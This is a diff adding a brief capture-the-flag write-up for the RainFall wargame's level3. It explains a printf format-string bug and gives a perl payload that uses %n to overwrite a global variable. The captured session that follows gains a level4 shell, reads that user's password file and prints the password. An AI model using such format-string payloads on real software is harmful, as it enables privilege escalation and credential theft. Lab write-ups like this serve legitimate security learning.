@@ -1,0 +1,20 @@
+m is a global variable stored at 0x0804988c
+esp content is 0xbffff4e0
+printf string is *(ebp-0x208) (0xbffff6f8)
+
+
+Format string :
+%n	let us write printed length to the variable pointed by arg
+$	allows us to choose the offset of in the memory
+
+We can set m to 64 by writing 64 char before %n and move
+the offset to the address at the beginning of the string
+
+	perl -e 'print "\x8c\x98\x04\x08                                                            %4\$n\n"' > /tmp/str
+	level3@RainFall:~$ cat /tmp/str - | ./level3
+	[[]
+	Wait what?!
+	whoami
+	level4
+	cat /home/user/level4/.pass
+	b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
